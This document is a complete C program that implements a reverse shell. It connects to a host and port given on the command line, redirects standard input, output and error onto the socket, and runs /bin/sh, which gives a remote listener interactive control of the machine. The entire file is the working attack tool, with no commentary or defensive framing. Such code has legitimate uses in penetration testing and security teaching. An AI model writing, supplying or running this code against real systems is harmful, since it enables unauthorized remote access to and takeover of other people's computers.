#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

void reverse_shell(const char *host, int port) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == -1) {
    perror("socket");
    exit(EXIT_FAILURE);
  }

  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);

  if (inet_pton(AF_INET, host, &sin.sin_addr) <= 0) {
    perror("inet_pton");
    close(sock);
    exit(EXIT_FAILURE);
  }

  if (connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) == -1) {
    perror("connect");
    close(sock);
    exit(EXIT_FAILURE);
  }

  if (dup2(sock, STDIN_FILENO) == -1 || dup2(sock, STDOUT_FILENO) == -1 || dup2(sock, STDERR_FILENO) == -1) {
    perror("dup2");
    close(sock);
    exit(EXIT_FAILURE);
  }

  char *argv[] = {"/bin/sh", NULL};
  if (execve("/bin/sh", argv, NULL) == -1) {
    perror("execve");
    close(sock);
    exit(EXIT_FAILURE);
  }
}

int main(int argc, char *argv[]) {
  if (argc != 3) {
    fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  const char *host = argv[1];
  int port = atoi(argv[2]);

  reverse_shell(host, port);

  return 0;
}
